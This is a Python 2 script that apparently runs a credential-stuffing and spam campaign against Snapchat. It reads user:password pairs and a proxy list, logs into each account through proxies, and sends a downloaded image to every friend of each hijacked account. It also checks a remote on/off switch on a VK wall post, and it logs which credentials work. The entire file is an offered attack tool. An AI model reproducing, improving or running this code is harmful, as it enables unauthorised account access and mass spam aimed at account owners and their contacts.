import urllib2, urllib, requests, json, threading, sys, random, socket
from snapi import Snapchat
from datetime import datetime

inputData = []
inputProxies = []
imagename = ""
threads = 1

def main():
    global threads, inputData, inputProxies
    #t = datetime.now()
    print datetime.now()
    sts = checkStates() 
    if sts == 0:
        print "Generating error. Contact me on skype 'volkvid'"
        try:
            zxc = raw_input()
        except EOFError:
            pass
        sys.exit(0) 
    elif sts == 1: 
        f = open("output.txt", "w")
        f.close()
        f = open("timeout.txt", "w")
        f.close()
        prepair()
        if threads == 1:
            oneThread(inputData, inputProxies)
        else:
            leni = len(inputData)
            if threads > leni:
                threads = leni
            
            authdata = slice_list(inputData, threads)
            for i in range(threads):
                data = authdata[i]
                prx = inputProxies
                thread = threading.Thread(target=oneThread, args=(data, prx, ))
                thread.start()
                thread.join() 

            print "\nRun out of accounts"
            print "time =", str(datetime.now() - t)


def oneThread(inp, inpProxy):
    result = []
    for proxy in inpProxy:
        if not bad_proxy(proxy):
        
            for auth in inp: 
                s = auth["user"]+":"+auth["pass"]
                if s not in result:
                    r = process(proxy, auth) 
                    if r["st"] != 0:
                        #any error
                        if r["st"] == -100:
                            result.append(s)
                            print s + " #error, wrong pass"
                            fff = open("output.txt", "a")
                            fff.write(s + " #error, wrong pass\n")
                            fff.close()
                        if r["st"] == -101:
                            result.append(s)
                            print s + " #error, no account"
                            fff = open("output.txt", "a")
                            fff.write(s + " #error, no account\n")
                            fff.close()
                        if r["st"] == 400:
                            result.append(s)
                            print s + " #error, may be no friends"
                            fff = open("output.txt", "a")
                            fff.write(s + " #error, may be no friends\n")
                            fff.close()
                        if r["st"] == 408:  # another file
                            result.append(s)
                            print s + " #error, timeout"
                            fff = open("output.txt", "a")
                            fff.write(s + " #error, timeout\n")
                            fff.close()
                            #timeout.txt
                            fff = open("timeout.txt", "a")
                            fff.write(s + " #error, timeout\n")
                            fff.close()
                        if r["st"] == 403:
                            # change proxy
                            break
                    else:
                        #no errors 
                        if r["num"] == 0:
                            result.append(s)
                            print s + " #error"
                            fff = open("output.txt", "a")
                            fff.write(s + " #error\n")
                            fff.close()
                        else:
                            result.append(s)
                            print s + " #" + str(r["num"])
                            fff = open("output.txt", "a")
                            fff.write(s + " #" + str(r["num"]) + "\n")
                            fff.close()
                            
    if len(inp) != len(result):
        print "Ran out of proxies"


def process(prox, auth):
    socket.setdefaulttimeout(None)
    
    ret = {"st": 408, "num": 0} # 403 = bad_proxy, 408 = timeout
    prox = {"https": "http://"+prox, "http": "http://"+prox}
    try:
        s = Snapchat()
        s.proxies = prox
    except Exception as ex:
        print "WOW:", str(ex)
        return ret
    try:
        asd = datetime.now()
        login = s.login(auth["user"], auth["pass"])
        print "(log t)", datetime.now() - asd
    except Exception:
        print "(log er)"
        ret["st"] = 403 # save this tag to another file #17 49
        return ret           
    try:
        status = login['status']
        ret["st"] = status
        print ".1e"
        return ret
    except:
        print ".1"
        pass
    try:
        asd = datetime.now()
        media_id = s.upload(imagename)
        if media_id == None:
            print "(d upl)"
            return ret
        else:
            print "(upl t)", datetime.now() - asd
            pass
    except Exception as ze:
        print "(upload)", str(ze)
        return ret
    recipients = ""
    for friend in login["friends"]:
        recipients += friend["name"] + ","
    print ".2"               
    asd = datetime.now()
    ret["st"] = 0
    ret["num"] = len(login["friends"])
    try:
        done = s.send(media_id, recipients, time = 10, timeout = (0.1, 1.0))
    except:
        print ".3 w to"
        
    print "(send t)", datetime.now() - asd        
    return ret


def bad_proxy(pip):
    socket.setdefaulttimeout(2)
    try:
        proxy_handler = urllib2.ProxyHandler({'https': pip})        
        opener = urllib2.build_opener(proxy_handler)
        opener.addheaders = [('User-agent', 'Snapchat/4.1.01 (Nexus 4; Android 18; gzip)')]
        # 'Mozilla/5.0'
        urllib2.install_opener(opener)        
        req=urllib2.Request('https://www.google.com')
        sock=urllib2.urlopen(req)
    except Exception as e:
        print "B", e 
        return True
    print "G"
    return False


def prepair():
    # IO here, updating all globals
    global imagename, threads, inputData, inputProxies
    try:
        proxiesFile = open("proxies.txt", "r")
        data = proxiesFile.read()
        proxiesFile.close()
        
        if data.find("\r\n") != -1:
            inputProxies = data.split("\r\n")
        else:
            inputProxies = data.split("\n")
            
        #inputProxies = sorted(inputProxies, key=lambda *args: random.random()) #exp
    except BaseException as ex:
        print "No file named 'proxies.txt', error " + str(ex)
        print "\nPress any key to exit"
        try:
            zxc = raw_input()
        except EOFError:
            pass
        sys.exit(0)

    try:
        inputFile = open("input.txt", "r")
        data = inputFile.read()
        inputFile.close()
        # because win/mac
        if data.find("\r\n") != -1:
            data = data.split("\r\n")
        else:
            data = data.split("\n")
            
        for item in data:
            item = item.split(":")
            inputData.append({
                "user":item[0].replace("\n", "").replace("\r\n", ""), 
                "pass":item[1].replace("\n", "").replace("\r\n", "")
                })
        #inputData = sorted(inputData, key=lambda *args: random.random()) #exp
    except BaseException as ex:
        print "No file named 'input.txt', error " + str(ex)
        print "\nPress any key to exit"
        try:
            zxc = raw_input()
        except EOFError:
            pass
        sys.exit(0)

    image = ""
    try:
        settingsFile = open("settings.txt", "r")
        data = settingsFile.read()
        settingsFile.close()

        if data.find("\r\n") != -1:
            data = data.split("\r\n")
        else:
            data = data.split("\n")
    
        for item in data:
            if item.find("image:") != -1:
                image = item.replace(" ", "")
            if item.find("threads:") != -1:
                threads = item.replace(" ", "")
        image = image.split("image:")[1]
        threads = int(threads.split("threads:")[1])
        if threads < 1:
            threads = 1
    except BaseException as ex:
        print "No file named 'settings.txt', error " + str(ex)
        print "\nPress any key to exit"
        try:
            zxc = raw_input()
        except EOFError:
            pass
        sys.exit(0)

    form = image.split("/")
    form = form[len(form)-1].split(".")[1]
    imagename = "file." + form
    urllib.urlretrieve(image, filename=imagename)
    #print "image is downloaded"


def checkStates():
    r = requests.get("https://api.vk.com/method/wall.get",
                     params = {"owner_id": "-79888882",
                               "count": "100",
                               "offset": "0", "v": "5.26"})
    r = json.loads(r.text)
    pid = -1
    for item in r['response']['items']:
        if item['text'] == 'snapchat controll': #code1
            pid = item['id']
    if pid == -1:
        return 0
    else:
        r = requests.get("https://api.vk.com/method/wall.getComments",
                         params = { "owner_id": "-79888882","post_id": pid,
                                    "count": "1", "offset": "0", "v": "5.26"})#, verify=False)
        r = json.loads(r.text)
        try:
            r = r['response']['items'][0]
            if r['text'] == 'isok' and r['from_id'] == -79888882: #code2
                return 1
            else:
                return 0
        except:
            return 0


def slice_list(input, size):
    input_size = len(input)
    slice_size = input_size / size
    remain = input_size % size
    result = []
    iterator = iter(input)
    for i in range(size):
        result.append([])
        for j in range(slice_size):
            result[i].append(iterator.next())
        if remain:
            result[i].append(iterator.next())
            remain -= 1
    return result


main()
